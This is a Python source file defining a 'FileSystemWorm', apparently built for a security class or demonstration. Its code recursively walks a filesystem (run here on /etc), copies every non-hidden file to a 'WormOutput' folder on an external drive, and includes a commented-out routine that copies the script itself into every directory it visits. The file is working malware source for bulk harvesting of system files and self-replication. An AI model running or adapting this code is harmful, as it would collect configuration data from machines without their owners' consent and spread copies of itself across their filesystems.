import os
import shutil

class FileSystemWorm:
    def __init__(self, base_path=None, dir_traversed=None, num_copies=None, target_drive=None):
        # set the base path to root if not specified, otherwise use the provided path
        self.base_path = "/" if base_path is None else base_path
        # initialize the list of directories that will be tracked
        self.dir_traversed = [] if dir_traversed is None else dir_traversed
        # set the number of file copies to 2 if not specified
        self.num_copies = 2 if num_copies is None else num_copies
        # store the absolute path of this script
        self.path = os.path.realpath(__file__)
        # specify path to external drive and where to copy the files to
        self.target_drive = os.path.join(target_drive if target_drive else '/media/seed/Seagate', 'WormOutput')

        
    def list_dirs(self, path):
        # recursively list directories and ignore hidden files
        self.dir_traversed.append(path)
        # for each directory in the current path, ignore hidden files and list directories
        for dir in os.listdir(path):
            # specify not to track hidden files
            if not dir.startswith('.'):
                # join the full path
                new_path = os.path.join(path, dir)
                # print out new path for logging
                print(new_path)
                # if the new path is a directory, list it
                if os.path.isdir(new_path):
                    self.list_dirs(new_path)

    def duplicate_files(self):
        # for each directory in the list of traversed directories
        for directory in self.dir_traversed:
            # for each file in the directory
            for file in os.listdir(directory):
                # specify the file path of the file
                file_path = os.path.join(directory, file)
                if os.path.isfile(file_path):
                    # if file is not hidden and the path is not a directory
                    if not file.startswith('.') and not os.path.isdir(file_path):
                        # duplicate the file by the specified amount of times
                        for i in range(self.num_copies):
                            base_name, ext = os.path.splitext(file)
                            safe_base_name = base_name.replace('\\x2d', '-')
                            # specify the destination of the file
                            destination = os.path.join(self.target_drive, f"{safe_base_name}{ext}")
                            # ensure the existence of the directory
                            os.makedirs(os.path.dirname(destination), exist_ok=True)
                            # copy the file to the destination
                            shutil.copyfile(file_path, destination)
                            
    # replicates the worm into each directory, commented out to avoid clutter and improve speed for presentation
    # def replicate_worm(self):
    #     # replicate the worm in each directory traversed
    #     for directory in self.dir_traversed:
    #         # specify the target path for the worm copy
    #         target = os.path.join(directory, "FileSystemWorm.py")
    #         if target != self.path:
    #             # copy the worm to the target directory
    #             shutil.copyfile(self.path, target)

    def execute(self):
        # execute the list function
        self.list_dirs(self.base_path)
        # print out directories traversed for logging
        print("Tracked directories:", self.dir_traversed)

        # execute the replicate function
        # self.replicate_worm() #### Commented out for presentation

        # execute the duplicate function
        self.duplicate_files()

if __name__ == "__main__":
    # get current working directory
    cwd = os.getcwd()
    
    # get directory of the etc folder for presentation
    etc = "/etc"

    # either specify the directory from which files should be copied or leave blank to use it from the root directory of the filesystem
    fsWorm = FileSystemWorm(base_path=etc)

    # start the worm
    fsWorm.execute()